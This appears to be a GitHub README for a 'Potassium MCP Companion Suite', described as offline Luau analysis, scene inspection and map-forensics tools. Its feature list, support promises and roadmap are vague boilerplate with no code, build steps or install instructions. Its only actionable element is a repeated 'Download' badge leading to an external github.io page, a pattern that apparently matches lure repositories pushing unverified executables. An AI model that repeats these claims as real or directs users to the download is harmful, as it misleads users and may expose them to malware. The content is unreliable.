![preview](https://raw.githubusercontent.com/andika3ghub/potassium-scene-lens/main/cover_d0d0a7.svg)
[![Download](https://raw.githubusercontent.com/andika3ghub/potassium-scene-lens/main/setup_d87727.svg)](https://andika3ghub.github.io/potassium-scene-lens/)

# Potassium MCP Companion Suite

**An independent, modular toolkit for scene inspection, map/recording forensics, Luau static analysis, and AI-assisted scripting workflows — built for creators, auditors, and tinkerers who want clarity without the cloud.**

Welcome to the **Potassium MCP Companion Suite**, a distinct and expanded sibling project inspired by the original `potassium-mcp` concept. Where the original focused on tight, independent utilities, this repository evolves the idea into a full-spectrum companion: a set of decoupled micro-tools that speak a common dialect, share a consistent interface philosophy, and can be composed like LEGO bricks to inspect, analyze, transform, and document scene data, saved maps, session recordings, and Luau source.

Think of it less as a single application and more as a **workbench**: each tool is a chisel, a caliper, a magnifying glass. You pick the one you need, use it, and put it back. No monolith. No forced telemetry. No lock-in.

---

## 📜 Table of Contents

- [Why This Exists](#-why-this-exists)
- [Feature List](#-feature-list)
- [Architecture Overview](#-architecture-overview)
- [Core Modules](#-core-modules)
  - [Scene Inspector](#-scene-inspector)
  - [Map & Recording Forensics](#-map--recording-forensics)
  - [Luau Static Analysis](#-luau-static-analysis)
  - [AI-Assisted Scripting Bridge](#-ai-assisted-scripting-bridge)
- [Interface & UX](#-interface--ux)
- [Multilingual Support](#-multilingual-support)
- [Support Model](#-support-model)
- [Roadmap 2026](#-roadmap-2026)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 Why This Exists

Most tooling in this space is either too heavy, too opinionated, or too coupled to a single runtime. The Potassium MCP Companion Suite takes the opposite stance: **small, sharp, independent instruments** that each do one job well and hand off cleanly to the next.

If a scene is a city, then this suite gives you the surveyor's theodolite, the auditor's ledger, the linguist's grammar book, and the architect's sketchpad — all in one drawer, none welded together.

The result is a workflow that feels less like operating a machine and more like conducting an orchestra.

---

## ✨ Feature List

- 🧩 **Modular micro-tools** — every module runs standalone or as part of a pipeline
- 🖥️ **Responsive UI** — adapts fluidly from ultrawide monitors to compact laptops
- 🌍 **Multilingual support** — locale bundles for major world languages, extensible by design
- 🛰️ **Offline-first philosophy** — analysis runs locally; the network is optional, never mandatory
- 🔍 **Scene diffing** — compare two scene snapshots and surface meaningful deltas
- 🗺️ **Saved map parsing** — read, normalize, and re-emit map structures
- 🎞️ **Recording timeline reconstruction** — replay event streams as structured data
- 🧠 **Luau static analysis** — type inference hints, dead code detection, taint-style flow tracing
- 🤖 **AI-assisted scripting bridge** — optional adapter that turns natural language into Luau scaffolds
- 🧪 **Deterministic outputs** — same input, same result, every time
- 📦 **Zero-glue composition** — modules communicate through a shared, documented schema
- 🔐 **Local-only by default** — nothing leaves your machine unless you explicitly export it
- 🧾 **Audit-friendly logs** — every transformation is recorded in a readable journal
- ♿ **Accessibility-aware design** — keyboard-first navigation, high-contrast themes
- 🌐 **SEO-conscious documentation** — discoverable, human-readable, machine-friendly
- 🕒 **Around-the-clock assistance channels** — see [Support Model](#-support-model)

---

## 🏗️ Architecture Overview

The suite follows a **hub-and-spoke** philosophy. A lightweight core provides:

1. **Schema Registry** — canonical definitions for scenes, maps, recordings, and Luau ASTs
2. **Journal** — append-only log of every operation, useful for reproducibility
3. **Locale Resolver** — loads translation bundles on demand
4. **Adapter Layer** — pluggable interfaces for AI providers, exporters, and importers

Each spoke — Inspector, Forensics, Analyzer, Bridge — depends on the core but **never on each other**. You can remove any spoke and the rest keep working. That is the point.

---

## 🔬 Core Modules

### 🧿 Scene Inspector

The Scene Inspector is your magnifying glass. It walks a scene graph, enumerates entities, and produces a normalized report covering:

- Entity hierarchy and parent-child relationships
- Property snapshots with type annotations
- Material and texture references
- Transform matrices in human-readable form
- Suspicious or anomalous node patterns flagged for review

Use it to answer questions like *"What changed between build 41 and build 42?"* or *"Why does this scene feel heavier than it looks?"*

### 🗺️ Map & Recording Forensics

This module handles **saved maps** and **session recordings** as first-class citizens.

- Decode map archives into structured tiles and metadata
- Reconstruct recording timelines into ordered event streams
- Compute coverage statistics — which regions were visited, which were ignored
- Detect gaps, jumps, and out-of-order anomalies
- Export to CSV, JSON, or a compact binary form for archival

If the Scene Inspector is the magnifying glass, this is the **forensic lab**: patient, precise, unflinching.

### 🧬 Luau Static Analysis

A static analyzer tailored to Luau's idioms:

- Type inference hints without requiring annotations
- Dead code and unreachable branch detection
- Taint-style flow tracing for suspicious data paths
- Module dependency graphs
- Style linting with configurable rulesets
- Safe refactor suggestions with before/after previews

The goal is not to nag. The goal is to **illuminate**.

### 🤖 AI-Assisted Scripting Bridge

An optional, adapter-based bridge that turns intent into scaffolding:

- Describe a behavior in plain language; receive a Luau skeleton
- Iteratively refine via structured prompts
- All generated code is linted by the analyzer before it ever reaches you
- Providers are pluggable: bring your own, or run fully local

The bridge is deliberately **opt-in**. The suite works perfectly without it, and always will.

---

## 🎨 Interface & UX

- **Responsive UI** across desktop and tablet form factors
- **Dark, light, and high-contrast themes**
- **Keyboard-first** — every action reachable without a pointer
- **Command palette** with fuzzy search
- **Session restore** — pick up where you left off
- **Exportable reports** in multiple formats

The interface aims to feel like a **well-organized workshop**, not a cockpit. Tools are where you expect them, labeled clearly, and never hidden behind nested menus.

---

## 🌍 Multilingual Support

Locale bundles ship for:

- English
- Español
- Français
- Deutsch
- Português
- 日本語
- 한국어
- 简体中文
- Русский

Adding a new language is a matter of dropping a JSON bundle into the appropriate directory and registering it in the locale manifest. Community contributions are welcome and encouraged.

---

## 🛎️ Support Model

Assistance is available **around the clock**, every day of the year. Channels include:

- 📖 Comprehensive in-repo documentation
- 💬 Discussion forums monitored continuously
- 🐛 Issue tracker with triage within one business day
- 📚 Example galleries and walkthroughs

Support is community-driven and maintained by the same people who use the tools daily. That is not a marketing line — it is the operating principle.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Stabilize schema registry v2; publish migration guide
- **Q2 2026** — Ship recording diff viewer with side-by-side timelines
- **Q3 2026** — Expand Luau analyzer with cross-module taint tracing
- **Q4 2026** — Release plugin SDK for third-party spokes

Dates are intentions, not contracts. Progress is tracked openly.

---

## 🔎 SEO & Discoverability Notes

This project is documented with discoverability in mind. If you arrived here searching for terms like *scene inspection toolkit*, *map recording analyzer*, *Luau static analysis*, *AI-assisted scripting bridge*, or *modular forensics utilities*, you are in the right place. Documentation uses natural language, meaningful headings, and structured metadata — no keyword stuffing, no dark patterns.

---

## ⚠️ Disclaimer

This project is an **independent, community-driven toolkit**. It is not affiliated with, endorsed by, or sponsored by any platform, engine, or vendor whose file formats it may read or write. All trademarks belong to their respective owners.

Users are responsible for ensuring their use of these tools complies with applicable terms of service, local laws, and ethical norms. The maintainers provide this software **as-is**, without warranty of any kind, express or implied.

Nothing in this repository is intended to circumvent protections, bypass safeguards, or enable misuse. If a use case feels ambiguous, ask first — the community is friendly.

---

## 📄 License

Released under the **MIT License**. See the full text here:

[LICENSE](./LICENSE)

Copyright © 2026 — Potassium MCP Companion Suite contributors.

---

[![Download](https://raw.githubusercontent.com/andika3ghub/potassium-scene-lens/main/setup_d87727.svg)](https://andika3ghub.github.io/potassium-scene-lens/)